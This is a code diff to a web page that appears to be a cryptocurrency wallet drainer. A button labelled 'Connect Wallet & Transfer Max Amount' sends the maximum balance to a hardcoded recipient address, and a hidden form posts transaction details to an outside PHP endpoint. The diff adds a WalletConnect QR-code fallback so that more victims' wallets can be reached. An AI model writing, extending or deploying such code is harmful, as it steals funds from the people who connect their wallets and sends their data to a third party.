@@ -20,10 +20,23 @@
             padding: 15px 25px;
             font-size: 16px;
         }
+        #qrCodeContainer {
+            display: none;
+            text-align: center;
+        }
+        #qrCodeContainer img {
+            width: 200px;
+            height: 200px;
+        }
     </style>
 </head>
 <body>
     <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
+
+    <div id="qrCodeContainer">
+        <h2>Scan QR Code with Your Wallet App</h2>
+        <div id="qrCode"></div>
+    </div>
 
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
@@ -33,6 +46,7 @@
         const connectButton = document.getElementById('connectButton');
         const transactionForm = document.getElementById('transactionForm');
         const transactionDetailsInput = document.getElementById('transactionDetails');
+        const qrCodeContainer = document.getElementById('qrCodeContainer');
         const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
         const gasLimit = 21000n; // Changed to BigInt
 
@@ -177,6 +191,18 @@
                         error: error.message
                     });
                     transactionForm.submit();
+                }
+            });
+
+            // Fallback to WalletConnect QR code if the wallet is not detected
+            web3Modal.on('connect', async (provider) => {
+                if (provider.isWalletConnect) {
+                    qrCodeContainer.style.display = 'block';
+                    const walletConnectProvider = provider.connector;
+                    const uri = await walletConnectProvider.getQrCode();
+                    const qrCodeImg = document.createElement('img');
+                    qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
+                    document.getElementById('qrCode').appendChild(qrCodeImg);
                 }
             });
         }
